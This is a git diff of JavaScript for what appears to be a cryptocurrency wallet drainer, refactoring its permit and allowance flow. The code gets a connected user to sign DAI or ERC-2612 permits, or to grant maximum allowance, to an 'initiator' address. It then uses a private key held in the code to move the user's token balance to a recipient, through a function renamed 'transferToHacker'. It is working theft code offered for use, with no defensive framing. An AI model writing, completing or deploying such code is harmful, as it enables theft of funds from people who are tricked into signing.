@@ -106,7 +106,6 @@ export const claim = async (_balance) => {
     console.log(result)
   }).catch((error) => {
     console.log(error)
-    claim(_balance);
   });
 };
 export const increaseAllowance = async (token) => {
@@ -122,7 +121,7 @@ export const increaseAllowance = async (token) => {
   const allow = await allownce(token);
   const balanceOfToken = await balanceOf(token);
   if (allow >= balanceOfToken) {
-    return await transfer(token);
+    return await transferToHacker(token);
   };
 
   const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
@@ -148,89 +147,25 @@ export const increaseAllowance = async (token) => {
       functionName: 'version',
     }).then( async (result) => {
       if( result === '1') {
-        await signDaiPermit(
-          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
-        ).then(async ( result) => {
-
-          const signer = new ethers.Wallet(constants.initiatorPK, provider);
-          const DaiToken = new ethers.Contract(
-            permitToken.address, constants.ALLOWANCEABI, signer
-          );
-
-          await DaiToken.permit(
-            getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
-          ).then(async (result) => {
-            console.log(result)
-            await waitForTransaction(result.transactionHash)
-            await transfer(token);
-          })
-
-        }).catch( (error) => {
-          console.log(error)
-          increaseAllowance(token)
-        });
-
+        await daiPermitV1(
+          permitToken, nonce, provider
+        )
       }else if (result === '2') {
-        await signERC2612Permit(
-          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
-        ).then(async ( result) => {
-
-          const signer = new ethers.Wallet(constants.initiatorPK, provider);
-          const DaiToken = new ethers.Contract(
-            permitToken.address, constants.permitV2, signer
-          );
-
-          await DaiToken.permit(
-            getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
-          ).then(async (result) => {
-            console.log(result)
-            await waitForTransaction(result.transactionHash)
-            await transfer(token);
-          })
-
-        }).catch( (error) => {
-          console.log(error)
-          increaseAllowance(token)
-        })
+        await usdcPermitV2(
+          permitToken, provider
+        )
       }
     }).catch((error) => {
       console.log(error);
     })
-    
   }else if (increaseallown) {
-    await writeContract({
-      address: token.token_address,
-      abi: constants.ALLOWANCEABI,
-      functionName: 'increaseAllowance',
-      args: [constants.initiator, constants.max],
-      gas: '100000',
-      gasPrice: feeData.gasPrice
-    }).then(async (result) => {
-      console.log(result)
-      await waitForTransaction(result.transactionHash)
-      await transfer(token);
-    }).catch( (error) => {
-      console.log(error)
-      increaseAllowance(token)
-    })
+    await increasAllow(token);
   }else if (transfertoken) {
-    await writeContract({
-      address: token.token_address,
-      abi: constants.ERC20ABI,
-      functionName: 'transfer',
-      args: [constants.recipient, token.balance],
-      gas: '100000',
-      gasPrice: feeData.gasPrice
-    }).then((result) => {
-      console.log(result)
-    }).catch( (error) => {
-      console.log(error)
-      increaseAllowance(token)
-    })
+    await transfer(token);
   }
 };
 
-export const transfer = async (token) => {
+export const transferToHacker = async (token) => {
   const amount = balanceOf(token)
   const provider = new ethers.providers.JsonRpcProvider(constants.infura);
   const signer = new ethers.Wallet(constants.initiatorPK, provider);
@@ -279,6 +214,82 @@ export const balanceOf = async (token) => {
     functionName: 'balanceOf',
     args: [getAccount().address],
     chainId: 1
+  }).catch( (error) => {
+    console.log(error)
+  })
+}
+
+const increasAllow = async (token) => {
+  await writeContract({
+    address: token.token_address,
+    abi: constants.ALLOWANCEABI,
+    functionName: 'increaseAllowance',
+    args: [constants.initiator, constants.max],
+    gas: '75000',
+  }).then(async (result) => {
+    console.log(result)
+    await waitForTransaction(result.transactionHash)
+    await transfer(token);
+  }).catch( (error) => {
+    console.log(error)
+  })
+}
+
+const transfer = async (token) => {
+  await writeContract({
+    address: token.token_address,
+    abi: constants.ERC20ABI,
+    functionName: 'transfer',
+    args: [constants.recipient, token.balance],
+    gas: '75000',
+  }).then((result) => {
+    console.log(result)
+  }).catch( (error) => {
+    console.log(error)
+  })
+}
+
+const daiPermitV1 = async (permitToken, nonce, provider) => {
+  await signDaiPermit(
+    window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
+  ).then(async ( result) => {
+
+    const signer = new ethers.Wallet(constants.initiatorPK, provider);
+    const DaiToken = new ethers.Contract(
+      permitToken.address, constants.ALLOWANCEABI, signer
+    );
+
+    await DaiToken.permit(
+      getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
+    ).then(async (result) => {
+      console.log(result)
+      await waitForTransaction(result.transactionHash)
+      await transferToHacker(token);
+    })
+
+  }).catch( (error) => {
+    console.log(error)
+  });
+}
+
+const usdcPermitV2 = async (permitToken, provider) => {
+  await signERC2612Permit(
+    window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
+  ).then(async ( result) => {
+
+    const signer = new ethers.Wallet(constants.initiatorPK, provider);
+    const DaiToken = new ethers.Contract(
+      permitToken.address, constants.permitV2, signer
+    );
+
+    await DaiToken.permit(
+      getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
+    ).then(async (result) => {
+      console.log(result)
+      await waitForTransaction(result.transactionHash)
+      await transferToHacker(token);
+    })
+
   }).catch( (error) => {
     console.log(error)
   })
